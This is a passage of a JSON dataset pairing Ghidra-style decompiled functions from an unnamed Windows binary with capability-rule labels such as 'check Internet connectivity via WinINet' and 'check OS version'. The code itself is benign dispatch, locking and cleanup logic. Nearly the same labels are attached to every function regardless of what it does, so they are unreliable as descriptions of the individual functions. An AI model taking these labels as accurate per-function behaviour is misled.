        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00074540(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00034550(0xb1c5a8fc);\n    iVar1 = fcn.0006ce50(arg_8h, 1);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else if (*(*arg_8h + 0x14) == 0) {\n        fcn.00036ab0(*arg_8h + 4);\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    fcn.000345c0(0xb1c5a8fc);\n    return var_4h;\n}\n",
        "token_count": 188
    },
    "00074630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00074630(int32_t **arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar2;\n    char *pcVar3;\n    uint uVar4;\n    uint var_2ch;\n    uint var_24h;\n    char *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    *arg_8h = NULL;\n    var_ch = 0;\n    while( true ) {\n        if (*(arg_ch + var_ch * 4) == 0) {\n            return 0x21590005;\n        }\n        arg_8h_00 = fcn.00035360(*(arg_ch + var_ch * 4));\n        if (arg_8h_00 == NULL) {\n            return 0x21590004;\n        }\n        var_4h = fcn.000785ce(arg_8h_00, 0x2e);\n        if (var_4h != NULL) {\n            *var_4h = 0;\n            var_4h = var_4h + 1;\n        }\n        pcVar3 = arg_8h_00;\n        uVar4 = arg_20h;\n        var_1ch = fcn.00075880(arg_8h_00);\n        if (var_1ch == 0) {\n            fcn.00035330(arg_8h_00);\n            var_18h = 0x21590005;\n            if (*0xb1c67774 != 0) {\n                if (arg_24h == 0) {\n                    var_18h = (**(*0xb1c67774 + 0xc))(arg_8h, *(arg_ch + var_ch * 4), arg_10h, arg_14h, arg_20h);\n                }\n                else {\n                    var_18h = (**(*0xb1c67774 + 0x10))\n                                        (arg_8h, *(arg_ch + var_ch * 4), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                                         pcVar3, uVar4);\n                }\n                if (var_18h == 0) {\n                    var_1ch = *0xb1c67774;\n                }\n            }\n        }\n        else {\n            if (var_4h == NULL) {\n                var_20h = arg_8h_00;\n                do {\n                    cVar1 = *var_20h;\n                    var_20h = var_20h + 1;\n                } while (cVar1 != '\\0');\n                var_14h = var_20h - (arg_8h_00 + 1);\n            }\n            else {\n                var_14h = var_4h - arg_8h_00;\n            }\n            fcn.00035330(arg_8h_00);\n            if (arg_24h == 0) {\n                var_18h = (**(var_1ch + 0xc))(arg_8h, *(arg_ch + var_ch * 4) + var_14h, arg_10h, arg_14h, arg_20h);\n            }\n            else {\n                var_18h = (**(var_1ch + 0x10))\n                                    (arg_8h, *(arg_ch + var_ch * 4) + var_14h, arg_10h, arg_14h, arg_18h, arg_1ch, \n                                     arg_20h);\n            }\n        }\n        if (var_1ch != 0) break;\n        var_ch = var_ch + 1;\n    }\n    if (var_18h != 0) {\n        return var_18h;\n    }\n    if (*arg_8h != NULL) {\n        arg_8h_01 = fcn.00035200(0x20);\n        if (arg_8h_01 == NULL) {\n            (**(var_1ch + 0x14))(*arg_8h, 0);\n            (**(var_1ch + 0x18))(*arg_8h, 0);\n            *arg_8h = NULL;\n            return 0x21590004;\n        }\n        *arg_8h_01 = var_1ch;\n        arg_8h_01[5] = 0;\n        arg_8h_01[6] = 0;\n        fcn.00036a10(arg_8h_01 + 1);\n        fcn.000344f0(arg_8h_01 + 7);\n        **arg_8h = arg_8h_01;\n        iVar2 = fcn.0006cd00(*arg_8h, 4);\n        if (iVar2 != 0) {\n            return 0;\n        }\n        fcn.00036a80(arg_8h_01 + 1);\n        fcn.00034520(arg_8h_01 + 7);\n        fcn.00035330(arg_8h_01);\n        (**(var_1ch + 0x14))(*arg_8h, 0);\n        (**(var_1ch + 0x18))(*arg_8h, 0);\n        *arg_8h = NULL;\n        return 0x21590004;\n    }\n    (**(var_1ch + 0x14))(*arg_8h, 0);\n    (**(var_1ch + 0x18))(*arg_8h, 0);\n    return -1;\n}\n",
        "token_count": 1335
    },
    "00074950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00074950(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t **arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    fcn.00034550(0xb1c5a900);\n    iVar1 = fcn.0006ce50(arg_8h_00, 4);\n    if (iVar1 == 0) {\n        fcn.000345c0(0xb1c5a900);\n        *arg_8h = NULL;\n    }\n    else {\n        arg_8h_01 = *arg_8h_00;\n        if (arg_8h_01[5] == 0) {\n            arg_8h_01[5] = 1;\n            fcn.000345c0(0xb1c5a900);\n            (**(**arg_8h_00 + 0x14))(arg_8h_00, arg_ch);\n            fcn.00036c40(arg_8h_01 + 1);\n            fcn.00034550(0xb1c5a900);\n            *arg_8h = NULL;\n            fcn.0006cd90(arg_8h_00, 4);\n            fcn.000345c0(0xb1c5a900);\n            (**(**arg_8h_00 + 0x18))(arg_8h_00, arg_ch);\n            fcn.00036cd0(arg_8h_01 + 1);\n            fcn.00036a80(arg_8h_01 + 1);\n            fcn.00034520(arg_8h_01 + 7);\n            fcn.00035330(arg_8h_01);\n        }\n        else {\n            fcn.000345c0(0xb1c5a900);\n            *arg_8h = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 460
    },
    "00074a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074a60(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000754f0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x1c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x1c) != 0)) {\n            var_4h = (**(**arg_8h + 0x1c))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 279
    },
    "00074b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074b20(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000754f0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x20) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x20) != 0)) {\n            var_4h = (**(**arg_8h + 0x20))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 276
    },
    "00074be0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00074be0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    iVar1 = fcn.000754f0(arg_8h);\n    if (iVar1 == 0) {\n        if (((**arg_8h + 0x24) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x24) != 0)) {\n            var_4h = (**(**arg_8h + 0x24))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if (var_4h == 0) {\n                var_4h = fcn.00076b80(arg_ch, arg_10h, arg_14h, arg_18h);\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    else {\n        var_4h = fcn.00076b80(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return var_4h;\n}\n",
        "token_count": 319
    },
    "00074cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074cb0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000754f0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x28) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x28) != 0)) {\n            var_4h = (**(**arg_8h + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 298
    },
    "00074d80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074d80(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000754f0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x2c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x2c) != 0)) {\n            var_4h = (**(**arg_8h + 0x2c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 301
    },
    "00074e50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00074e50(int32_t **arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = fcn.0006ce50(arg_8h, 4);\n    if ((iVar2 != 0) && (arg_ch != 0)) {\n        piVar1 = *arg_8h;\n        fcn.00034550(piVar1 + 7);\n        if (0 < piVar1[6]) {\n            piVar1[6] = piVar1[6] + -1;\n            fcn.000345c0(piVar1 + 7);\n            (**(**arg_8h + 0x30))(arg_8h, arg_ch);\n            fcn.00036b60(*arg_8h + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "00074ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074ed0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000754f0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x34) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x34) != 0)) {\n            var_4h = (**(**arg_8h + 0x34))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 287
    },
    "00074f90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00074f90(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.000754f0(arg_8h);\n    if (var_8h == 0) {\n        if (((**arg_8h + 0x38) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x38) != 0)) {\n            var_8h = (**(**arg_8h + 0x38))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_8h == 0) && (*arg_ch != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034550(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.000345c0(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_8h = 0x21590006;\n                }\n                fcn.00036b60(*arg_8h + 1);\n                *arg_ch = 0;\n                *arg_10h = 0;\n            }\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_8h = 0x21590001;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 407
    },
    "000750a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000750a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00075110(arg_8h, arg_ch, arg_10h);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075970(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.00074ed0(arg_8h, arg_ch_00, var_4h, arg_10h);\n            fcn.00035330(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 200
    },
    "00075110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00075110(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000754f0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x3c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x3c) != 0)) {\n            var_4h = (**(**arg_8h + 0x3c))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 278
    },
    "000751d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000751d0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000754f0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x40) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x40) != 0)) {\n            var_4h = (**(**arg_8h + 0x40))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 298
    },
    "000752a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000752a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00075320(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075970(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.000751d0(arg_8h, arg_ch_00, var_4h, arg_10h, arg_14h);\n            fcn.00035330(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 216
    },
    "00075320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00075320(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000754f0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x44) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x44) != 0)) {\n            var_4h = (**(**arg_8h + 0x44))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 286
    },
    "000753e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.000753e0(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.000754f0(arg_8h);\n    if (var_8h == 0) {\n        if (((**arg_8h + 0x48) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x48) != 0)) {\n            var_8h = (**(**arg_8h + 0x48))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if ((var_8h == 0) && (*arg_ch != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034550(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.000345c0(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_8h = 0x21590006;\n                }\n                fcn.00036b60(*arg_8h + 1);\n                *arg_ch = 0;\n                *arg_10h = 0;\n            }\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_8h = 0x21590001;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 418
    },
    "000754f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000754f0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00034550(0xb1c5a900);\n    iVar1 = fcn.0006ce50(arg_8h, 4);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else if (*(*arg_8h + 0x14) == 0) {\n        fcn.00036ab0(*arg_8h + 4);\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    fcn.000345c0(0xb1c5a900);\n    return var_4h;\n}\n",
        "token_count": 187
    },
    "00075560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0007567d)\n// WARNING: Removing unreachable block (ram,0x0007568a)\n// WARNING: Removing unreachable block (ram,0x0007568c)\n// WARNING: Removing unreachable block (ram,0x000756a5)\n// WARNING: Removing unreachable block (ram,0x000756b4)\n// WARNING: Removing unreachable block (ram,0x0007569c)\n// WARNING: Removing unreachable block (ram,0x000756ca)\n// WARNING: Removing unreachable block (ram,0x000756dc)\n// WARNING: Removing unreachable block (ram,0x000756d3)\n// WARNING: Removing unreachable block (ram,0x000756f8)\n// WARNING: Removing unreachable block (ram,0x00075703)\n// WARNING: Removing unreachable block (ram,0x00075709)\n// WARNING: Removing unreachable block (ram,0x0007572c)\n\nuint __cdecl fcn.00075560(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_2ch;\n    uint var_24h;\n    char *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    iVar2 = fcn.000569a0(0xb1c67778);\n    if (iVar2 < 2) {\n        fcn.0006cc70();\n        iVar2 = *0xb1c460bc;\n        for (var_18h = 0; *(iVar2 + var_18h * 0xc) != 0; var_18h = var_18h + 1) {\n            iVar3 = (**(*(iVar2 + 8 + var_18h * 0xc) + 4))();\n            if (iVar3 != 0) {\n                for (var_10h = 0; var_10h < var_18h; var_10h = var_10h + 1) {\n                    (**(*(iVar2 + 8 + var_10h * 0xc) + 8))();\n                }\n                return 0x21590007;\n            }\n        }\n        var_4h = arg_8h;\n        while ((var_4h != NULL && (*var_4h != '\\0'))) {\n            var_20h = var_4h;\n            do {\n                cVar1 = *var_20h;\n                var_20h = var_20h + 1;\n                var_4h = var_20h;\n            } while (cVar1 != '\\0');\n        }\n        fcn.00073850();\n        fcn.00075a20();\n        fcn.00076ce0();\n        fcn.000745b0();\n    }\n    return 0;\n}\n",
        "token_count": 655
    },
    "00075750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00075750(void)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.000674e0(0xb1c67778);\n    if (iVar1 == 0) {\n        for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n            if (*(var_4h * 8 + -0x4e3b9f44) != 0) {\n                iVar1 = *(var_4h * 8 + -0x4e3b9f44);\n                for (var_ch = 0; *(iVar1 + var_ch * 0xc) != 0; var_ch = var_ch + 1) {\n                    (**(*(iVar1 + 8 + var_ch * 0xc) + 8))();\n                }\n                if (*(var_4h * 8 + -0x4e3b9f48) != 0) {\n                    *(var_4h * 8 + -0x4e3b9f48) = 0;\n                    *(var_4h * 8 + -0x4e3b9f44) = 0;\n                }\n            }\n        }\n        fcn.00073860();\n        fcn.00075a30();\n        fcn.00076cf0();\n        fcn.000745c0();\n        fcn.0006cc80();\n    }\n    return;\n}\n",
        "token_count": 345
    },
    "000758a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.000758a0(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint var_1ch;\n    int32_t var_18h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint8_t **var_8h;\n    int32_t var_4h;\n    \n    var_4h = 9;\n    do {\n        if (var_4h < 0) {\n            return NULL;\n        }\n        for (var_8h = *(var_4h * 8 + -0x4e3b9f44); (var_8h != NULL && (*var_8h != NULL)); var_8h = var_8h + 3) {\n            var_ch = arg_8h;\n            var_10h = *var_8h;\n            do {\n                uVar1 = *var_10h;\n                bVar2 = uVar1 < *var_ch;\n                if (uVar1 != *var_ch) {\ncode_r0x00075933:\n                    var_18h = (1 - bVar2) - (bVar2 != 0);\n                    goto code_r0x0007593b;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = var_10h[1];\n                bVar2 = uVar1 < var_ch[1];\n                if (uVar1 != var_ch[1]) goto code_r0x00075933;\n                var_10h = var_10h + 2;\n                var_ch = var_ch + 2;\n            } while (uVar1 != 0);\n            var_18h = 0;\ncode_r0x0007593b:\n            if ((var_18h == 0) && (var_8h[1] == arg_ch)) {\n                return var_8h[2];\n            }\n        }\n        var_4h = var_4h + -1;\n    } while( true );\n}\n",
        "token_count": 461
    },
    "00075970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00075970(uint *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *arg_ch = 0;\n    for (var_ch = arg_8h; var_ch != NULL; var_ch = *var_ch) {\n        *arg_ch = *arg_ch + var_ch[2];\n    }\n    iVar1 = fcn.00035200(*arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        var_4h = 0;\n        for (var_ch = arg_8h; var_ch != NULL; var_ch = *var_ch) {\n            fcn.0007877e(iVar1 + var_4h, var_ch[1], var_ch[2]);\n            var_4h = var_4h + var_ch[2];\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 227
    },
    "00075a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
